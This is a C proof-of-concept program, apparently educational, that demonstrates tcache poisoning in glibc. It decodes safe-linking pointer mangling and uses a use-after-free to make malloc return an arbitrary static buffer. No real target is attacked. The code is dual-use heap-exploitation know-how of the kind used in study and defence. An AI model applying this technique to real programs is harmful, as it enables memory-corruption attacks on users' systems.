#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

void *allocations[3];

typedef struct tcache_entry {
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;

#define PROTECT_PTR(pos, ptr)                                                  \
  ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))

#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)

size_t demangle(size_t ptr) {
  size_t o2 = (ptr >> 12) ^ ptr;
  return (o2 >> 24) ^ o2 & 0xfffffffffff0;
}

static char bad_buffer[0x100];

int main() {
  for (int i = 0; i < 3; i++) {
    allocations[i] = malloc(0x20);
    printf("addr of alloc[%d]: %p\n", i, allocations[i]);
  }

  printf("\n");

  free(allocations[2]);
  free(allocations[0]);
  free(allocations[1]);

  printf("fd  of alloc[0]: %p\n", ((tcache_entry *)allocations[0])->next);
  printf("key of alloc[0]: 0x%lx\n", ((tcache_entry *)allocations[0])->key);

  printf("fd  of alloc[0]: %p\n", ((tcache_entry *)allocations[1])->next);
  printf("key of alloc[0]: 0x%lx\n", ((tcache_entry *)allocations[1])->key);

  void *fd_alloc1 =
      PROTECT_PTR(allocations[1], ((tcache_entry *)allocations[1])->next);
  printf("revealed fd of alloc [1]: %p\n", fd_alloc1);

  assert(fd_alloc1 == allocations[0]);
  /* Only works sometimes due to ASLR
   * Demangle requires the two consecutive chunks to be in the same page
   * assert(demangle((size_t)((tcache_entry*)allocations[1])->next) ==
   * (size_t)allocations[0]);
   */

  /* Use after free */
  ((tcache_entry *)allocations[1])->next = PROTECT_PTR(
      &((tcache_entry *)allocations[1])->next, (tcache_entry *)bad_buffer);

  assert(malloc(0x20) == allocations[1]);
  assert(malloc(0x20) == bad_buffer);
}
